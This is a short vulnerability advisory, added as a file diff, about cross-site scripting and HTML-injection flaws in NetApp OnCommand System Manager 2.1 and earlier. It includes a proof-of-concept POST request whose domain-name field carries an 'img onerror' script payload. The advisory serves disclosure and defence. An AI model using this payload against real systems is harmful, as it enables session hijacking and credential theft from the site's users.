@@ -1,0 +1,16 @@
+source: http://www.securityfocus.com/bid/59688/info
+
+NetApp OnCommand System Manager is prone to multiple cross-site scripting and HTML-injection vulnerabilities because it fails to properly sanitize user-supplied input.
+
+Successful exploits will allow attacker-supplied HTML and script code to run in the context of the affected browser, potentially allowing the attacker to steal cookie-based authentication credentials or control how the site is rendered to the user. Other attacks are also possible.
+
+NetApp OnCommand System Manager 2.1, 2.0.2 and prior versions are vulnerable.
+
+Request (domain-name):
+    POST /zapiServlet HTTP/1.1
+    Host: 127.0.0.1:1195
+    [...]
+    <netapp version="1.7" 
+xmlns="http://www.example.com/filer/admin";><cifs-setup><auth-type>workgroup</auth-type><domain-name><img src=x 
+onerror=alert(1) 
+    </domain-name><security-style>multiprotocol</security-style><server-name>FILER</server-name></cifs-setup></netapp>
